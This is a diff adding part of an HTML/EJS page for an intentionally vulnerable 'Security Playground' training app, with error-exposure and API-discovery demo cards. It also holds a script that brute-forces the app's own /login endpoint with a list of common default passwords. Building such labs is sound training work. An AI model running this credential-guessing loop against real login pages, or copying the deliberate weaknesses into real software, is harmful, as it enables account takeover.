+            <div style="margin-top:16px">
+              <div class="try-label">💥 Error Exposure</div>
+              <div class="form-group">
+                <select class="form-select" id="error-type">
+                  <option value="reference">ReferenceError</option>
+                  <option value="type">TypeError</option>
+                  <option value="sql">SQL Error</option>
+                  <option value="json">JSON Parse Error</option>
+                  <option value="generic">Generic Error</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-danger" onclick="triggerError()">💥 Trigger Error</button>
+              </div>
+              <div class="response-viewer" id="error-response">
+                <div class="response-tabs"><button class="response-tab active">Error Response</button></div>
+                <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+                <div class="response-body"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- API Discovery -->
+        <div class="vuln-card" id="apidisc-section">
+          <div class="card-header">
+            <div class="card-icon icon-teal">🗺️</div>
+            <div class="card-header-info">
+              <div class="card-title">API Discovery</div>
+              <div class="card-meta">
+                <span class="owasp-tag">OWASP A09:2021</span>
+                <span class="risk-badge risk-low">LOW</span>
+                <span class="owasp-tag">CWE-200</span>
+              </div>
+            </div>
+          </div>
+          <div class="card-body">
+            <p class="card-description">
+              The <code>GET /api</code> endpoint returns a complete list of all available
+              endpoints with their vulnerability descriptions — useful for automated scanning
+              and Burp Suite / OWASP ZAP enumeration.
+            </p>
+            <p style="font-size:12px;color:var(--text-muted);margin-top:8px">
+              Press <code style="font-size:11px;background:rgba(255,255,255,0.08);padding:2px 6px;border-radius:4px">Ctrl + `</code> anytime to open API list.
+            </p>
+          </div>
+          <div class="card-try">
+            <div class="try-label">🧪 Try It</div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="fetchApiList()">🗺️ List All Endpoints</button>
+            </div>
+            <div class="response-viewer" id="apidisc-response">
+              <div class="response-tabs"><button class="response-tab active">API Map</button></div>
+              <div class="response-status"><span>Status:</span><span class="response-status-text">—</span></div>
+              <div class="response-body"></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <div style="padding:24px 32px;border-top:1px solid var(--border);color:var(--text-muted);font-size:12px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px">
+      <span>⚠️ Security Playground v1.0.0 — Intentionally Vulnerable — Local Use Only</span>
+      <span>Node.js · Express · SQLite · EJS · Port <%= port %></span>
+    </div>
+
+  </main>
+</div>
+
+<script src="/js/app.js"></script>
+<script>
+// Brute force demo
+window.bruteForceDemo = async function() {
+  const log  = document.getElementById('brute-log');
+  const counter2 = document.getElementById('attempt-counter-2');
+  log.textContent = '';
+
+  const creds = [
+    { u: 'admin', p: 'password' },
+    { u: 'admin', p: '123456' },
+    { u: 'admin', p: 'admin' },
+    { u: 'admin', p: 'admin123' },
+    { u: 'alice', p: 'alice' },
+    { u: 'bob',   p: 'bob' },
+    { u: 'admin', p: 'qwerty' },
+    { u: 'bender',p: 'bender' },
+    { u: 'eve',   p: 'password123' },
+    { u: 'admin', p: 'letmein' }
+  ];
+
+  for (let i = 0; i < creds.length; i++) {
+    const { u, p } = creds[i];
+    const res = await fetch('/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username: u, password: p })
+    });
+    const data = await res.json();
+    counter2.textContent = data.attempts || (i + 1);
+
+    if (data.success) {
+      log.textContent += `[${i+1}] ✅ SUCCESS: ${u}:${p} → ${data.user.role}\n`;
+    } else {
+      log.textContent += `[${i+1}] ❌ FAIL:    ${u}:${p}\n`;
+    }
+    log.scrollTop = log.scrollHeight;
+    await new Promise(r => setTimeout(r, 50)); // tiny delay for visibility
+  }
+
+  document.getElementById('attempt-counter').textContent = counter2.textContent;
+};
+
+// Sync attempt counters
+setInterval(async () => {
+  const res = await fetch('/login/attempts').catch(() => null);
+  if (!res) return;
+  const data = await res.json().catch(() => null);
+  if (!data) return;
+  const c1 = document.getElementById('attempt-counter');
+  const c2 = document.getElementById('attempt-counter-2');
+  if (c1) c1.textContent = data.attempts;
+  if (c2) c2.textContent = data.attempts;
+}, 3000);
+</script>
+</body>
+</html>
